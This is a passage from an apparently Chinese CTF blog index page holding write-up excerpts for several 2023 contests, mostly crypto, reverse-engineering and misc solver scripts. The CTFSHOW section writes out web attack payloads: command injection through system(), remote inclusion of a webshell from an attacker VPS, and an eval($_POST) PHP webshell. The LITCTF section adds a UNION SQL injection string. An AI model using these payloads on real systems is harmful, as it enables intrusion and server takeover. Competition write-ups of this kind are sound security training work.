for i in range(0,52):
    Str[i] ^= 0x5E;
    res = res + chr(Str[i])
bd_res = base64.b64decode(res)

res2 = []
for i in range(len(bd_res)):
    res2.append(bd_res[i])
    
def swap(a1,a2):
    tmp = res2[a1]
    res2[a1] = res2[a2]
    res2[a2] = tmp
for j in range(99,-1,-1):
    swap((j+8)%v7, (j+9)%v7)
    swap((j+3)%v7, (j+10)%v7)
    swap((j+1)%v7, (j+7)%v7)
    swap((j+5)%v7, (j+2)%v7)
flag = &#39;&#39;
for i in range(len(res2)):
    res2[i] = 255 - res2[i]
    flag += chr(res2[i])
print(flag)
</code></pre>
<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="welcome"><a href="#welcome" class="headerlink" title="welcome"></a>welcome</h2><p>追踪tcp流导出rar包</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/8f9da213dee9854aa0ce71702e856bdc.png" alt="image-20230510124343152">得知密码是da19b65c17dc</p>
<p>解压得到flag</p>
<h2 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h2><p>追踪tcp流,导出zip包</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/ed305a1e49f6d319dedfd4395889f5cb.png" alt="image-20230509115200536"></p>
<p>里面一个password文件一个加密的文件</p>
<p>password文件尾是jpg</p>
<p>补个文件头FF D8</p>
<p>然后爆破宽高</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/05dc18a08943da1f9cd3882af38f1289.png" alt="image-20230509115738296"></p>
<p>改720</p>
<p>发现类似密码的东西</p>
<p>拿去解压缩包发现不对,一个个隐写工具试过去</p>
<p>发现steghide可行</p>
<p>得到密码</p>
<p>NjBjNDk3YmMxOTM4YzhkNA&#x3D;&#x3D;</p>
<p>60c497bc1938c8d4</p>
<p>解压得到flag</p>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #ff7d73">开发语言</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/php/" style="color: #00a596">php</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/linux/" style="color: #ffa2c4">linux</a>
        </span>
        
    </div>
    <a href="/2023/05/16/2023%E5%AE%81%E6%B3%A2%E5%B8%82%E8%B5%9B%20%E5%A4%A9%E4%B8%80%E6%B0%B8%E5%AE%89%E6%9D%AF%E8%B5%9B%E5%89%8D%E6%A8%A1%E6%8B%9F%E9%A2%98%E9%83%A8%E5%88%86wp/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2023/05/14/CTFSHOW%E5%91%A8%E6%9C%AB%E5%A4%A7%E6%8C%91%E6%88%98wp/">
        <h2 class="post-title">CTFSHOW周末大挑战wp</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/5/14
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><p>挺麻烦的是 &#x2F;不能写,会截断解析,这里我用了base64解码后再运行<br>做到4的时候才想起来可以直接cd</p>
<pre><code class="bash">?u=http://system(&quot;`echo%20%27Y2F0IC9mbGFnX2lzX2hlcmUudHh0%27|base64%20-d`&quot;);:
</code></pre>
<h1 id="2"><a href="#2" class="headerlink" title="2"></a>2</h1><p>远程包含vps上的一句话<br><code>?u=username:http://vps地址/x.php</code></p>
<h1 id="3"><a href="#3" class="headerlink" title="3"></a>3</h1><p>还是远程vps<br><code>/?u=http:://vps地址/x.php</code></p>
<h1 id="4"><a href="#4" class="headerlink" title="4"></a>4</h1><p>cd 后再读取<br><code>?u=http://cd ..%26%26cd ..%26%26cd ..%26%26tac 1_f1ag_1s_h3re</code></p>
<h1 id="5"><a href="#5" class="headerlink" title="5"></a>5</h1><p><code>?u=user://pass:fragment@scheme:9090/path?http://vps地址/x.php%23query</code><br>构造流程如下<br><img src="https://img-blog.csdnimg.cn/5fece1ceebbf4245b5637547e2bd84d3.png" alt="在这里插入图片描述"></p>
<h1 id="6"><a href="#6" class="headerlink" title="6"></a>6</h1><p>一开始想用伪协议,然后base64-decode写马<br>然后发现path无论如何都会以&#x2F;开头,伪协议用不了<br>要 直接写马又不能有<code>?</code><br>没想到版本是5.几的<br><code>&lt;script language=&quot;php&quot;&gt;</code>还能用</p>
<p><code>//&lt;script language=&quot;php&quot;&gt;eval($_POST[1]);:/var/www/html/shell.php</code></p>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00a596">网络安全</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/php/" style="color: #00bcd4">php</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/linux/" style="color: #ff7d73">linux</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E8%BF%90%E7%BB%B4/" style="color: #ffa2c4">运维</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/" style="color: #00bcd4">服务器</a>
        </span>
        
    </div>
    <a href="/2023/05/14/CTFSHOW%E5%91%A8%E6%9C%AB%E5%A4%A7%E6%8C%91%E6%88%98wp/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2023/05/14/LITCTF2023%20%E9%83%A8%E5%88%86WP/">
        <h2 class="post-title">LITCTF2023 部分WP</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/5/14
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="我Flag呢？"><a href="#我Flag呢？" class="headerlink" title="我Flag呢？"></a>我Flag呢？</h2><p>查看源码就有flag了<br><img src="https://img-blog.csdnimg.cn/8317353a125941adb692c1dbd7ca0efc.png" alt="在这里插入图片描述"><br>彩蛋</p>
<h2 id="导弹迷踪"><a href="#导弹迷踪" class="headerlink" title="导弹迷踪"></a>导弹迷踪</h2><p><img src="https://img-blog.csdnimg.cn/5138b92792aa4a399ec95505e7619bb6.png" alt="在这里插入图片描述"></p>
<h2 id="Follow-me-and-hack-me"><a href="#Follow-me-and-hack-me" class="headerlink" title="Follow me and hack me"></a>Follow me and hack me</h2><p><img src="https://img-blog.csdnimg.cn/148ac39fa59142c0b415bc6b042a4d61.png" alt="在这里插入图片描述"></p>
<p>然后彩蛋<a target="_blank" rel="noopener" href="http://www.zip解压即可/">www.zip解压即可</a></p>
<h2 id="PHP是世界上最好的语言！！"><a href="#PHP是世界上最好的语言！！" class="headerlink" title="PHP是世界上最好的语言！！"></a>PHP是世界上最好的语言！！</h2><p>直接可以命令执行,当时想了好久<br><img src="https://img-blog.csdnimg.cn/28de1607a2114f37a7346e96312a524e.png" alt="在这里插入图片描述"></p>
<h2 id="Vim-yyds"><a href="#Vim-yyds" class="headerlink" title="Vim yyds"></a>Vim yyds</h2><p>扫目录,有swp文件<br><img src="https://img-blog.csdnimg.cn/154d649914724574a6b43e6dc6c13cfb.png" alt="然后按提示"><br><img src="https://img-blog.csdnimg.cn/824b7d621e8042839de4097263e7bcc1.png" alt="在这里插入图片描述"></p>
<h2 id="作业管理系统"><a href="#作业管理系统" class="headerlink" title="作业管理系统"></a>作业管理系统</h2><p>任意文件上传,传个马访问就行<br>彩蛋<br><img src="https://img-blog.csdnimg.cn/5dab43517cc140a89d22450d33af1128.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/742db4ff29854a77892ad057de908b40.png" alt="在这里插入图片描述"></p>
<h2 id="这是什么？SQL-！注一下-！"><a href="#这是什么？SQL-！注一下-！" class="headerlink" title="这是什么？SQL ！注一下 ！"></a>这是什么？SQL ！注一下 ！</h2><p><code>?id=1))))))union select version(),group_concat(flag)from ctftraining.flag%23</code><br>彩蛋输入2<br>这彩蛋是难找</p>
<h2 id="Http-pro-max-plus"><a href="#Http-pro-max-plus" class="headerlink" title="Http pro max plus"></a>Http pro max plus</h2><p><img src="https://img-blog.csdnimg.cn/66becfa08e0b41f9a7d5752caae3e9cb.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/3ba8a2c37c5e45958ba0f6674bf186c8.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/d12fa5f1d45546638ed67213cb168548.png" alt="在这里插入图片描述"></p>
<h2 id="Ping"><a href="#Ping" class="headerlink" title="Ping"></a>Ping</h2><p><img src="https://img-blog.csdnimg.cn/1987fd51940b4ffdae6dda007aca89c6.png" alt="在这里插入图片描述"></p>
<h2 id="1zjs"><a href="#1zjs" class="headerlink" title="1zjs"></a>1zjs</h2><p><img src="https://img-blog.csdnimg.cn/dce35292f6474628b4eb72404c1833ca.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/b06b2c0780fb475dab8282d952a82983.png" alt="在这里插入图片描述"></p>
<h2 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h2><p>获取方式都写在之前的题里了</p>
<h2 id="就当无事发生"><a href="#就当无事发生" class="headerlink" title="就当无事发生"></a>就当无事发生</h2><p>上探姬的github<br><img src="https://img-blog.csdnimg.cn/f01534f3dada472583eaf389d3c55bd9.png" alt="在这里插入图片描述"><br>怕你们找不到<br><code>https://github.com/ProbiusOfficial/ProbiusOfficial.github.io/commit/f04fe251bf8811324d4e71cd87b4b15581358490</code></p>
<h2 id="Flag点击就送！"><a href="#Flag点击就送！" class="headerlink" title="Flag点击就送！"></a>Flag点击就送！</h2><p>session伪造<br>先随便填个名字拿session<br>然后用flask_session_cookie_manager生成<br><code>SecertKey</code>是<code>LitCTF</code><br>一开始用<code>flask-unsign</code>没爆破出来<br>后面实在没题做一点点手动试SecretKey<br>像<code>Probius</code> <code>NSSCTF</code> <code>LitCTF</code>比赛贴什么试什么</p>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="只需要nc一下"><a href="#只需要nc一下" class="headerlink" title="只需要nc一下~"></a>只需要nc一下~</h2><p>nc连上去 flag在env</p>
<h2 id="口算题卡"><a href="#口算题卡" class="headerlink" title="口算题卡"></a>口算题卡</h2><p>交互题</p>
<pre><code class="python">import pwn
io = pwn.remote(&quot;node6.anna.nssctf.cn&quot;,28258)
io.recv()
while True:
    res = io.recvline()
    print(res)
    if b&#39;What is &#39; in res:
        res = str(eval(res[8:-2]))
        io.sendline(res.encode())
</code></pre>
<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="世界上最棒的程序员"><a href="#世界上最棒的程序员" class="headerlink" title="世界上最棒的程序员"></a>世界上最棒的程序员</h2><p><img src="https://img-blog.csdnimg.cn/4eedc91426c34fd68987b3e559e514e0.png" alt="在这里插入图片描述"></p>
<h2 id="ez-XOR"><a href="#ez-XOR" class="headerlink" title="ez_XOR"></a>ez_XOR</h2><pre><code class="python">import pwn
v8 = &#39;E`&#125;J]OrQF[V8zV:hzpV&#125;fVF[t&#39;
print(pwn.xor(v8,3*3))
</code></pre>
<h2 id="enbase64"><a href="#enbase64" class="headerlink" title="enbase64"></a>enbase64</h2><p>换表的base64<br><img src="https://img-blog.csdnimg.cn/39c265793ac14797b7656da96d54a728.png" alt="在这里插入图片描述"><br>把表拿出来解就行</p>
<pre><code class="python">s = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#39;

def basechange(source):
    destination = list(source)
    v3 = [
        16, 34, 56, 7, 46, 2, 10, 44, 20, 41, 59, 31, 51, 60, 61, 26, 5, 40, 21, 38,
        4, 54, 52, 47, 3, 11, 58, 48, 32, 15, 49, 14, 37, 0, 55, 53, 24, 35, 18, 25,
        33, 43, 50, 39, 12, 19, 13, 42, 9, 17, 28, 30, 23, 36, 1, 22, 57, 63, 8, 27,
        6, 62, 45, 29
    ]

    for _ in range(48):
        for j in range(64):
            source[j] = destination[v3[j]]
        destination = source.copy()

    return &#39;&#39;.join(destination)
print(basechange(list(s)))
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/d2a232ac80d2487aa7b8b5b44b5967cb.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/5818d2886f0749358e01bb824e9611f5.png" alt="在这里插入图片描述"></p>
<h2 id="snake"><a href="#snake" class="headerlink" title="snake"></a>snake</h2><p>pyc文件,反编译<br>发现不行,头有问题<br>找个py37的头补上<br><img src="https://img-blog.csdnimg.cn/09d3da2bb5b545709dd75a8f9a16e9a9.png" alt="在这里插入图片描述"><br>然后uncompyle6反编译得到</p>
<pre><code class="python"># uncompyle6 version 3.9.0
# Python bytecode version base 3.7.0 (3394)
# Decompiled from: Python 3.10.8 (tags/v3.10.8:aaaf517, Oct 11 2022, 16:50:30) [MSC v.1933 64 bit (AMD64)]
# Embedded file name: game.py
# Compiled at: 2021-08-18 04:22:44
# Size of source mod 2**32: 3409 bytes
&quot;&quot;&quot;贪吃蛇&quot;&quot;&quot;
import random, sys, time, pygame
from pygame.locals import *
from collections import deque
SCREEN_WIDTH = 600
SCREEN_HEIGHT = 480
SIZE = 20
LINE_WIDTH = 1
SCOPE_X = (
 0, SCREEN_WIDTH // SIZE - 1)
SCOPE_Y = (2, SCREEN_HEIGHT // SIZE - 1)
FOOD_STYLE_LIST = [
 (10, (255, 100, 100)), (20, (100, 255, 100)), (30, (100, 100, 255))]
LIGHT = (100, 100, 100)
DARK = (200, 200, 200)
BLACK = (0, 0, 0)
RED = (200, 30, 30)
BGCOLOR = (40, 40, 60)

def print_text(screen, font, x, y, text, fcolor=(255, 255, 255)):
    imgText = font.render(text, True, fcolor)
    screen.blit(imgText, (x, y))


def init_snake():
    snake = deque()
    snake.append((2, SCOPE_Y[0]))
    snake.append((1, SCOPE_Y[0]))
    snake.append((0, SCOPE_Y[0]))
    return snake


def create_food(snake):
    food_x = random.randint(SCOPE_X[0], SCOPE_X[1])
    food_y = random.randint(SCOPE_Y[0], SCOPE_Y[1])
    while (food_x, food_y) in snake:
        food_x = random.randint(SCOPE_X[0], SCOPE_X[1])
        food_y = random.randint(SCOPE_Y[0], SCOPE_Y[1])

    return (
     food_x, food_y)


def get_food_style():
    return FOOD_STYLE_LIST[random.randint(0, 2)]


def main():
    pygame.init()
    screen = pygame.display.set_mode((SCREEN_WIDTH, SCREEN_HEIGHT))
    pygame.display.set_caption(&#39;贪吃蛇&#39;)
    font1 = pygame.font.SysFont(&#39;SimHei&#39;, 24)
    font2 = pygame.font.Font(None, 72)
    fwidth, fheight = font2.size(&#39;GAME OVER&#39;)
    b = True
    snake = init_snake()
    food = create_food(snake)
    food_style = get_food_style()
    pos = (1, 0)
    game_over = True
    start = False
    score = 0
    orispeed = 0.5
    speed = orispeed
    last_move_time = None
    pause = False
    while 1:
        for event in pygame.event.get():
            if event.type == QUIT:
                sys.exit()

        screen.fill(BGCOLOR)
        for x in range(SIZE, SCREEN_WIDTH, SIZE):
            pygame.draw.line(screen, BLACK, (x, SCOPE_Y[0] * SIZE), (x, SCREEN_HEIGHT), LINE_WIDTH)

        for y in range(SCOPE_Y[0] * SIZE, SCREEN_HEIGHT, SIZE):
            pygame.draw.line(screen, BLACK, (0, y), (SCREEN_WIDTH, y), LINE_WIDTH)

        curTime = game_over or time.time()
        if curTime - last_move_time &gt; speed and not pause:
            b = True
            last_move_time = curTime
            next_s = (snake[0][0] + pos[0], snake[0][1] + pos[1])
            if next_s == food:
                snake.appendleft(next_s)
                score += food_style[0]
                speed = orispeed - 0.03 * (score // 100)
                food = create_food(snake)
                food_style = get_food_style()
            else:
                if SCOPE_X[0] &lt;= next_s[0] &lt;= SCOPE_X[1]:
                    if SCOPE_Y[0] &lt;= next_s[1] &lt;= SCOPE_Y[1]:
                        if next_s not in snake:
                            snake.appendleft(next_s)
                            snake.pop()
                        else:
                            game_over = True
                    if not game_over:
                        pygame.draw.rect(screen, food_style[1], (food[0] * SIZE, food[1] * SIZE, SIZE, SIZE), 0)
                    for s in snake:
                        pygame.draw.rect(screen, DARK, (s[0] * SIZE + LINE_WIDTH, s[1] * SIZE + LINE_WIDTH,
                         SIZE - LINE_WIDTH * 2, SIZE - LINE_WIDTH * 2), 0)

                    print_text(screen, font1, 30, 7, f&quot;速度: &#123;score // 100&#125;&quot;)
                    print_text(screen, font1, 450, 7, f&quot;得分: &#123;score&#125;&quot;)
                    if score &gt; 1000:
                        flag = [
                         30, 196, 
                         52, 252, 49, 220, 7, 243, 
                         3, 241, 24, 224, 40, 230, 
                         25, 251, 28, 233, 40, 237, 
                         4, 225, 4, 215, 40, 231, 
                         22, 237, 14, 251, 10, 169]
                        for i in range(0, len(flag), 2):
                            flag[i], flag[i + 1] = flag[i + 1] ^ 136, flag[i] ^ 119

                        print_text(screen, font2, (SCREEN_WIDTH - fwidth) // 2, (SCREEN_HEIGHT - fheight) // 2, bytes(flag).decode(), RED)
                        pygame.display.update()
                    if game_over:
                        if start:
                            print_text(screen, font2, (SCREEN_WIDTH - fwidth) // 2, (SCREEN_HEIGHT - fheight) // 2, &#39;GAME OVER&#39;, RED)
                pygame.display.update()


if __name__ == &#39;__main__&#39;:
    main()
</code></pre>
<p>找到输出flag的那段逻辑运行</p>
<pre><code class="python">flag = [
    30, 196, 
    52, 252, 49, 220, 7, 243, 
    3, 241, 24, 224, 40, 230, 
    25, 251, 28, 233, 40, 237, 
    4, 225, 4, 215, 40, 231, 
    22, 237, 14, 251, 10, 169]
for i in range(0, len(flag), 2):
    flag[i], flag[i + 1] = flag[i + 1] ^ 136, flag[i] ^ 119
for i in flag:
    print(chr(i),end=&#39;&#39;)
</code></pre>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Hex？Hex！-初级"><a href="#Hex？Hex！-初级" class="headerlink" title="Hex？Hex！(初级)"></a>Hex？Hex！(初级)</h2><p>long_to_bytes</p>
<h2 id="梦想是红色的-初级"><a href="#梦想是红色的-初级" class="headerlink" title="梦想是红色的 (初级)"></a>梦想是红色的 (初级)</h2><p>社会主义核心价值观解码</p>
<h2 id="原来你也玩原神-初级"><a href="#原来你也玩原神-初级" class="headerlink" title="原来你也玩原神 (初级)"></a>原来你也玩原神 (初级)</h2><p>百度查表一个个对</p>
<h2 id="家人们！谁懂啊，RSA签到都不会-初级"><a href="#家人们！谁懂啊，RSA签到都不会-初级" class="headerlink" title="家人们！谁懂啊，RSA签到都不会 (初级)"></a>家人们！谁懂啊，RSA签到都不会 (初级)</h2><pre><code class="python">from Crypto.Util.number import *
import gmpy2
p = 12567387145159119014524309071236701639759988903138784984758783651292440613056150667165602473478042486784826835732833001151645545259394365039352263846276073
q = 12716692565364681652614824033831497167911028027478195947187437474380470205859949692107216740030921664273595734808349540612759651241456765149114895216695451
c = 108691165922055382844520116328228845767222921196922506468663428855093343772017986225285637996980678749662049989519029385165514816621011058462841314243727826941569954125384522233795629521155389745713798246071907492365062512521474965012924607857440577856404307124237116387085337087671914959900909379028727767057
e = 65537
n = p*q
print(long_to_bytes(pow(c,(gmpy2.invert(e,(p-1)*(q-1))),n)))
</code></pre>
<h2 id="yafu-中级"><a href="#yafu-中级" class="headerlink" title="yafu (中级)"></a>yafu (中级)</h2><p>yafu分解pq其它和上题一样</p>
<h2 id="factordb-中级"><a href="#factordb-中级" class="headerlink" title="factordb (中级)"></a>factordb (中级)</h2><p>factordb查pq其它和上题一样</p>
<h2 id="校外-P-Leak"><a href="#校外-P-Leak" class="headerlink" title="(校外)P_Leak"></a>(校外)P_Leak</h2><p>dp泄露</p>
<h2 id="校外-md5的破解"><a href="#校外-md5的破解" class="headerlink" title="(校外)md5的破解"></a>(校外)md5的破解</h2><pre><code class="python">from Crypto.Util.number import *
import hashlib
import string
s = string.ascii_lowercase+string.digits

enc = &quot;LitCTF&#123;&#123;md5can&#123;&#125;&#123;&#125;3de&#123;&#125;rypt213thoughcr&#123;&#125;sh&#125;&#125;&quot;
print(enc)
target = &#39;496603d6953a15846cd7cc476f146771&#39;
for i in s:
    for i2 in s:
        for j in s:
            for k in s:
                    tmp = enc.format(i,i2,j,k)
                    if (hashlib.md5(tmp.encode()).hexdigest() == target):
                        print (tmp)
                        break
</code></pre>
<h2 id="校外-e的学问"><a href="#校外-e的学问" class="headerlink" title="(校外)e的学问"></a>(校外)e的学问</h2><p>e phi 不互素</p>
<h2 id="校外-我测你vva"><a href="#校外-我测你vva" class="headerlink" title="(校外)我测你vva"></a>(校外)我测你vva</h2><pre><code class="python">def decrypt(ciphertext):
    decrypted = &quot;&quot;
    for i in range(len(ciphertext)):
        if i % 2 == 0:
            cipher = ord(ciphertext[i])
            cipher = cipher - i
            decrypted += chr(cipher)
        else:
            cipher = ord(ciphertext[i])
            cipher = cipher + i
            decrypted += chr(cipher)
    return decrypted

ciphertext = &quot;HYEQJvPZ~X@+Bp&quot;  # 输入加密后的字符串
plaintext = decrypt(ciphertext)
print(plaintext)
</code></pre>
<h2 id="The-same-common-divisor-高级"><a href="#The-same-common-divisor-高级" class="headerlink" title="The same common divisor (高级)"></a>The same common divisor (高级)</h2><p>共模<br>n2拿n1^n3求</p>
<h2 id="你是我的关键词-Keyworld-初级"><a href="#你是我的关键词-Keyworld-初级" class="headerlink" title="你是我的关键词(Keyworld) (初级)"></a>你是我的关键词(Keyworld) (初级)</h2><p>我不知道是不是这么做的,我是这么做的<br>这是原文<br><code>IFRURC&#123;X0S_YP3_JX_HBXV0PA&#125;</code><br>前六位必为LITCTF 单表替换<br>然后根据你是我的关键词猜测得到<br>you_are_my_keyword<br>一一对应替换再改nss<br><code>NSSCTF&#123;Y0U_AR3_MY_KEYW0RD&#125;</code></p>
<h2 id="校外-Is-this-only-base"><a href="#校外-Is-this-only-base" class="headerlink" title="(校外)Is this only base?"></a>(校外)Is this only base?</h2><p><img src="https://img-blog.csdnimg.cn/ca8135e926824a0984905c8701fd7025.png" alt="rail fance 23"></p>
<h2 id="校外-Virginia"><a href="#校外-Virginia" class="headerlink" title="(校外)Virginia"></a>(校外)Virginia</h2><p>Virginia密码<br><code>https://www.guballa.de/vigenere-solver</code><br>上半密码flag<br>下半密码ulub</p>
<pre><code class="python">flag=[86, 116, 128, 80, 98, 85, 139, 122, 134, 114, 125, 136, 117, 123, 129, 127, 128, 128, 142, 130, 140, 147, 127, 132, 131, 136, 151, 134, 152, 164]

xxx = &#39;&#39;
for i in range(len(flag)):
    xxx += chr(flag[::-1][i] - (39-i))

print(xxx[::-1])
</code></pre>
<h2 id="校外-babyLCG"><a href="#校外-babyLCG" class="headerlink" title="(校外)babyLCG"></a>(校外)babyLCG</h2><pre><code class="python">from sympy import *
from gmpy2 import *
from functools import reduce
from primefac import *
result = [699175025435513913222265085178805479192132631113784770123757454808149151697608216361550466652878, 193316257467202036043918706856603526262215679149886976392930192639917920593706895122296071643390, 1624937780477561769577140419364339298985292198464188802403816662221142156714021229977403603922943, 659236391930254891621938248429619132720452597526316230221895367798170380093631947248925278766506, 111407194162820942281872438978366964960570302720229611594374532025973998885554449685055172110829, 1415787594624585063605356859393351333923892058922987749824214311091742328340293435914830175796909, 655057648553921580727111809001898496375489870757705297406250204329094679858718932270475755075698, 1683427135823894785654993254138434580152093609545092045940376086714124324274044014654085676620851, 492953986125248558013838257810313149490245209968714980288031443714890115686764222999717055064509, 70048773361068060773257074705619791938224397526269544533030294499007242937089146507674570192265]



def crack_unknown_modulus(states): 
    diffs = [s1 - s0 for s0, s1 in zip(states, states[1:])] 
    zeroes = [t2*t0 - t1*t1 for t0, t1, t2 in zip(diffs, diffs[1:], diffs[2:])] 
    modulus = abs(reduce(gcd, zeroes)) 
    factors = factorint(modulus)
    while not isprime(modulus): 
        for prime, order in factors.items():
            if prime.bit_length() &gt; 128:
                continue
            modulus = modulus / prime**order
    multiplier = (states[2] - states[1]) * modinv(states[1] - states[0], modulus) % modulus 
    increment = (states[1] - states[0]*multiplier) % modulus
    print((states[0] - increment) * invert(multiplier, modulus) % modulus)
    return modulus, multiplier, increment
_,__,___ = crack_unknown_modulus(result)
</code></pre>
<p>运行得到种子<br>种子long_to_bytes就是flag</p>
<h2 id="easy-math-中级"><a href="#easy-math-中级" class="headerlink" title="easy_math (中级)"></a>easy_math (中级)</h2><p>z3求p q</p>
<pre><code class="python">import z3
p,q = z3.Ints(&#39;p q&#39;)
x = z3.Solver()

n = 2230791374046346835775433548641067593691369485828070649075162141394476183565187654365131822111419512477883295758461313983481545182887415447403634720326639070667688614534290859200753589300443797
hint = 392490868359411675557103683163021977774935163924606169241731307258226973701652855448542714274348304997416149742779376023311152228735117186027560227613656229190807480010615064372521942836446425717660375242197759811804760170129768647414717571386950790115746414735411766002368288743086845078803312201707960465419405926186622999423245762570917629351110970429987377475979058821154568001902541710817731089463915930932142007312230897818177067675996751110894377356758932
equs = [p**3 - q**5 == hint, p*q==n]
x.add(equs)
check = x.check()
model = x.model()
print(model)
</code></pre>
<pre><code class="python">import z3
from Crypto.Util.number import *
import gmpy2


e = 65537
c = 2168563038335029902089976057856861885635845445863841607485310134441400500612435296818745930370268060353437465666224400129105788787423156958336380480503762222278722770240792709450637433509537280
n = 2230791374046346835775433548641067593691369485828070649075162141394476183565187654365131822111419512477883295758461313983481545182887415447403634720326639070667688614534290859200753589300443797

q = 304683618109085947723284393392507415311
p = 7321664971326604351487965655099805117568571010588695608389113791312918573783115429227542573780838065461696504325762281209452761930184231131129306271846427
print(long_to_bytes(pow(c,(gmpy2.invert(e,(p-1)*(q-1))),n)))
</code></pre>
<h2 id="校外-隐晦的聊天记录"><a href="#校外-隐晦的聊天记录" class="headerlink" title="(校外)隐晦的聊天记录"></a>(校外)隐晦的聊天记录</h2><p>一次一密(opt)</p>
<pre><code class="python">import pwn
a = b&#39;6c73d5240a948c86981bc294814d&#39;


b = b&#39;attack at dawn&#39;
b = bytes.hex(b).encode()
c = b&#39;Monday or Thur&#39;
c = bytes.hex(c).encode()
flag = &#39;&#39;
for i in range(0,len(a),2):
    intres = int(a[i:i+2],16)^int(b[i:i+2],16)^int(c[i:i+2],16)
    strres = str(hex(intres)).replace(&quot;0x&quot;,&quot;&quot;)
    if len(strres)!=2:
        print(i)
        strres = &#39;0&#39;+strres

    flag += strres

print(flag.encode())
</code></pre>
<h2 id="校外-Euler"><a href="#校外-Euler" class="headerlink" title="(校外)Euler"></a>(校外)Euler</h2><p>欧拉降幂<br>m ^(n-p-q+3)^ ≡ c mod n<br>等价于<br>m ^(n-p-q+3)mod^ ^φn()^ ≡ c mod n</p>
<pre><code class="python">import gmpy2
from Crypto.Util.number import *
n = 115140122725890943990475192890188343698762004010330526468754961357872096040956340092062274481843042907652320664917728267982409212988849109825729150839069369465433531269728824368749655421846730162477193420534803525810831025762500375845466064264837531992986534097821734242082950392892529951104643690838773406549
c = 406480424882876909664869928877322864482740577681292497936198951316587691545267772748204383995815523935005725558478033908575228532559165174398668885819826720515607326399097899572022020453298441
# c = pow(m,2,n)
print(long_to_bytes(gmpy2.iroot(c,2)[0]))
</code></pre>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><p>这边主要是队友在做,队友做的我就不写了 </p>
<h2 id="OSINT-探姬去哪了-1"><a href="#OSINT-探姬去哪了-1" class="headerlink" title="OSINT 探姬去哪了?_1"></a>OSINT 探姬去哪了?_1</h2><p>图片上勉强能认清字母<br>搜索得知是松果酒店<br>然后高德搜,试了几个就对了</p>
<p>松果酒店(郑州农业路店)</p>
<h2 id="OSINT-探姬去哪了-3"><a href="#OSINT-探姬去哪了-3" class="headerlink" title="OSINT 探姬去哪了?_3"></a>OSINT 探姬去哪了?_3</h2><p>给了图cqr扫,得知是郑州轻工业大学<br>最后一定是2层-217<br>一共两个校区,来回试试<br>然后搜个楼层图一个个试,也就十几次就出了<br>科学校区-第1教学楼-2层-217</p>
<h2 id="两仪生四象-中级"><a href="#两仪生四象-中级" class="headerlink" title="两仪生四象 (中级)"></a>两仪生四象 (中级)</h2><pre><code class="python">_hash = &#123;&quot;乾&quot;: &quot;111&quot;, &quot;兑&quot;: &quot;011&quot;, &quot;离&quot;: &quot;101&quot;, &quot;震&quot;: &quot;001&quot;, &quot;巽&quot;: &quot;110&quot;, &quot;坎&quot;: &quot;010&quot;, &quot;艮&quot;: &quot;100&quot;, &quot;坤&quot;: &quot;000&quot;&#125;

_reverse_hash = &#123;v: k for k, v in _hash.items()&#125;

text = &quot;LitCTF&#123;*********&#125;&quot;

text = text[7:-1]

binary_text = &#39;&#39;.join(format(ord(c), &#39;010b&#39;) for c in text)

encoded_text = &quot;&quot;
for i in range(0, len(binary_text), 3):
    try:
        encoded_text += _reverse_hash[binary_text[i:i + 3]]
    except KeyError:
        encoded_text += &quot;&quot;

print(encoded_text)

